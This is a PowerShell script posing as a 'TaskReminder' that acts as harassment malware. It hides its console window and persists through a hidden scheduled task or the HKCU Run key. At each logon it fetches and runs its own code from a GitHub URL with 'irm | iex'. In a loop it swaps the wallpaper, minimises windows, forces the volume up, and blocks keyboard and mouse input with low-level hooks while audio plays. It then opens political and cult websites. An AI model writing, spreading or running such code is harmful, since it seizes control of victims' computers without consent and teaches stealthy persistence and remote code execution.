# ================= CONFIG =================
$BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
$ScriptUrl = "$BaseUrl/reminders.ps1"   # must match this script's filename in the repo

$Sites = @{
    1 = "https://heavensgate.com/"
    2 = "https://action.aipac.org/aipac-pac-donate"
    3 = "https://www.palantir.com/platforms/gotham/"
    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
}


$MinSeconds      = 10
$MaxSeconds      = 120
$Volume          = 0.5    # Windows system volume during reminders (0.0 - 1.0)
$SetSystemVolume = $true  # set to $false to leave your system volume alone
$AvoidRepeat     = $true
$MinimizeAll     = $true  # minimise all windows at each reminder
$MaxAudioWait    = 60     # never wait longer than this (seconds) for audio to finish
$ShowConsole     = $false # set to $true when debugging (keeps the window visible)

$FreezeInput     = $true  # block keyboard/mouse while audio plays (no admin needed)
$FreezeVolume    = $true  # keep volume pinned and unmuted while audio plays

$TaskName        = "TaskReminder"
$DailyStartTime  = "08:00"  # daily start, in addition to every logon
$LogonDelay      = "PT20S"  # wait after login before starting
# ==========================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Dir = Join-Path $env:TEMP "TaskReminder"
New-Item -ItemType Directory -Path $Dir -Force | Out-Null
$LogFile = Join-Path $Dir "log.txt"

function Log($m) {
    "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile
    if ($ShowConsole) { Write-Host $m }
}

# ---- Hide the terminal window hosting this script ----
if (-not $ShowConsole) {
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinHide {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   public static extern IntPtr GetAncestor(IntPtr hWnd, uint flags);
    [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int cmd);
}
"@ -ErrorAction Stop
        $c = [WinHide]::GetConsoleWindow()
        if ($c -ne [IntPtr]::Zero) {
            $root = [WinHide]::GetAncestor($c, 3)
            if ($root -eq [IntPtr]::Zero) { $root = $c }
            [void][WinHide]::ShowWindow($root, 0)
            if ($root -ne $c) { [void][WinHide]::ShowWindow($c, 0) }
            Log "Window hidden"
        } else { Log "No console window found to hide" }
    } catch { Log "HIDE FAILED: $($_.Exception.Message)" }
}

$whoami = "$env:USERDOMAIN\$env:USERNAME"
Log "--- started as $whoami. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion)"

# ---- Only one copy at a time ----
$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
$PID | Out-File (Join-Path $Dir "pid.txt")

# ---- Autostart (runs as YOU, no admin needed) ----
# Tries a scheduled task (logon + daily); falls back to the HKCU Run key. Result is logged.
$PsExe  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$RunCmd = "irm '$ScriptUrl' | iex"
$taskOk = $false
try {
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        $taskOk = $true
        Log "AUTOSTART: scheduled task already exists"
    } else {
        $action = New-ScheduledTaskAction -Execute $PsExe -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
        $logon  = New-ScheduledTaskTrigger -AtLogOn -User $whoami
        $logon.Delay = $LogonDelay
        $daily  = New-ScheduledTaskTrigger -Daily -At $DailyStartTime
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                    -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)
        $principal = New-ScheduledTaskPrincipal -UserId $whoami -LogonType Interactive -RunLevel Limited
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($logon, $daily) `
            -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
        if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
            $taskOk = $true
            Log "AUTOSTART: scheduled task created for $whoami"
        } else { Log "AUTOSTART: task registration returned no error but task not found" }
    }
} catch { Log "AUTOSTART TASK FAILED: $($_.Exception.Message)" }

if (-not $taskOk) {
    try {
        $cmd = "`"$PsExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value $cmd -ErrorAction Stop
        Log "AUTOSTART: fell back to HKCU Run key"
    } catch { Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" }
}

# ---- Wait for network (up to 60s) so the downloads work right after login ----
$n = 0
while (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60) { Start-Sleep -Seconds 1; $n++ }
if ($n -gt 0) { Log "Waited ${n}s for network" }

# ---- Download assets (always refreshed) ----
foreach ($i in 1..5) {
    foreach ($f in "image$i.jpg", "audio$i.wav") {
        $dest = Join-Path $Dir $f
        $tmp  = "$dest.tmp"
        try {
            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile $tmp -ErrorAction Stop
            $len = (Get-Item $tmp).Length
            if ($len -lt 1000) { throw "file is only $len bytes (not a real file?)" }
            Move-Item $tmp $dest -Force
            Log "Downloaded $f ($len bytes)"
        } catch {
            Log "DOWNLOAD FAILED $BaseUrl/$f : $($_.Exception.Message)"
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    }
}

# ---- Wallpaper support ----
$wpOk = $false
try {
    Add-Type @"
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@ -ErrorAction Stop
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
    $wpOk = $true
} catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }

# ---- Input freeze support (low-level keyboard + mouse hooks, no admin needed) ----
$freezeOk = $false
if ($FreezeInput) {
    try {
        Add-Type -ErrorAction Stop @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class InputFreezer {
    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
    [DllImport("user32.dll")] static extern int GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
    [DllImport("user32.dll")] static extern bool PostThreadMessage(uint idThread, uint msg, IntPtr w, IntPtr l);

    [StructLayout(LayoutKind.Sequential)]
    struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptx; public int pty; }

    static HookProc kbProc = KbCallback;
    static HookProc msProc = MsCallback;
    static IntPtr hKb = IntPtr.Zero, hMs = IntPtr.Zero;
    static Thread t;
    static uint tid;
    static ManualResetEvent ready;
    public static bool Ok;
    public static int LastError;

    static IntPtr KbCallback(int n, IntPtr w, IntPtr l) { if (n >= 0) return (IntPtr)1; return CallNextHookEx(hKb, n, w, l); }
    static IntPtr MsCallback(int n, IntPtr w, IntPtr l) { if (n >= 0) return (IntPtr)1; return CallNextHookEx(hMs, n, w, l); }

    public static bool Start() {
        if (t != null) return Ok;
        ready = new ManualResetEvent(false);
        Ok = false;
        t = new Thread(() => {
            tid = GetCurrentThreadId();
            IntPtr mod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            hKb = SetWindowsHookEx(13, kbProc, mod, 0);   // WH_KEYBOARD_LL
            if (hKb == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
            hMs = SetWindowsHookEx(14, msProc, mod, 0);   // WH_MOUSE_LL
            if (hMs == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
            Ok = (hKb != IntPtr.Zero && hMs != IntPtr.Zero);
            ready.Set();
            if (Ok) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
            hKb = IntPtr.Zero; hMs = IntPtr.Zero;
        });
        t.IsBackground = true;
        t.Start();
        ready.WaitOne(3000);
        if (!Ok) Stop();
        return Ok;
    }

    public static void Stop() {
        if (t == null) return;
        PostThreadMessage(tid, 0x0012, IntPtr.Zero, IntPtr.Zero);   // WM_QUIT
        if (!t.Join(2000)) {
            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
        }
        t = null; Ok = false;
    }
}
"@
        $freezeOk = $true
    } catch { Log "INPUT FREEZE SETUP FAILED: $($_.Exception.Message)" }
}

# ---- System volume support (Windows Core Audio) ----
$volOk = $false
if ($SetSystemVolume) {
    try {
        Add-Type -ErrorAction Stop @"
using System.Runtime.InteropServices;

[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}

[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}

[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int f();
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}

[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
class MMDeviceEnumeratorComObject { }

public class SysVol {
    static IAudioEndpointVolume Vol() {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(0, 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 23, 0, out epv));
        return epv;
    }
    public static float Volume {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute {
        get { bool m; Marshal.ThrowExceptionForHR(Vol().GetMute(out m)); return m; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
"@
        $volOk = $true
    } catch { Log "VOLUME SETUP FAILED: $($_.Exception.Message)" }
}

# ---- Audio support ----
$player = $null
try {
    Add-Type -AssemblyName PresentationCore -ErrorAction Stop
    $player = New-Object System.Windows.Media.MediaPlayer
} catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }

# ---- Main loop ----
$last = 0
while ($true) {
    do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
    $last = $x
    Log "Task $x"

    # 1. Wallpaper
    if ($wpOk) {
        try {
            $img = Join-Path $Dir "image$x.jpg"
            $r = [WP]::SystemParametersInfo(20, 0, $img, 3)
            if (-not $r) { Log "Wallpaper call returned 0 for $img" }
        } catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
    }

    # 2. Minimise all windows (show the desktop)
    if ($MinimizeAll) {
        try {
            (New-Object -ComObject Shell.Application).MinimizeAll()
            Log "Minimised all windows"
        } catch { Log "MINIMISE FAILED: $($_.Exception.Message)" }
    }

    # 3. Set system volume, play audio and wait for it to finish
    $waitMs = 0
    if ($player) {
        try {
            $file = Join-Path $Dir "audio$x.wav"
            $player.Stop()
            $player.Close()
            $player = New-Object System.Windows.Media.MediaPlayer
            $player.Open([Uri]$file)
            $player.Volume = 1.0

            $t = 0
            while (-not $player.NaturalDuration.HasTimeSpan -and $t -lt 30) {
                Start-Sleep -Milliseconds 100
                $t++
            }

            if ($player.NaturalDuration.HasTimeSpan) {
                if ($volOk) {
                    try {
                        [SysVol]::Mute   = $false
                        [SysVol]::Volume = [single]$Volume
                        Log "System volume set to $([int]([SysVol]::Volume * 100))%"
                    } catch { Log "VOLUME SET FAILED: $($_.Exception.Message)" }
                }
                $dur = $player.NaturalDuration.TimeSpan.TotalSeconds
                $player.Play()
                Log "Playing audio$x.wav ($([int]$dur)s)"
                $waitMs = [int]([math]::Min($dur + 0.5, $MaxAudioWait) * 1000)
            } else {
                Log "AUDIO FAILED to load $file ($((Get-Item $file -ErrorAction SilentlyContinue).Length) bytes)"
            }
        } catch { Log "AUDIO FAILED: $($_.Exception.Message)" }
    }

    if ($waitMs -gt 0) {
        # Freeze keyboard/mouse for the length of the audio
        $frozen = $false
        if ($FreezeInput -and $freezeOk) {
            try {
                $frozen = [InputFreezer]::Start()
                if ($frozen) { Log "Input frozen" } else { Log "INPUT FREEZE FAILED (win32 error $([InputFreezer]::LastError))" }
            } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
        }
        try {
            $end = (Get-Date).AddMilliseconds($waitMs)
            while ((Get-Date) -lt $end) {
                if ($FreezeVolume -and $volOk) {
                    try {
                        if ([SysVol]::Mute) { [SysVol]::Mute = $false }
                        if ([math]::Abs([SysVol]::Volume - $Volume) -gt 0.01) { [SysVol]::Volume = [single]$Volume }
                    } catch {}
                }
                Start-Sleep -Milliseconds 100
            }
        } finally {
            if ($frozen) { [InputFreezer]::Stop(); Log "Input released" }
        }
    }

    # 4. Open the website after the audio has finished
    try { Start-Process $Sites[$x] -ErrorAction Stop }
    catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }

    Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
}
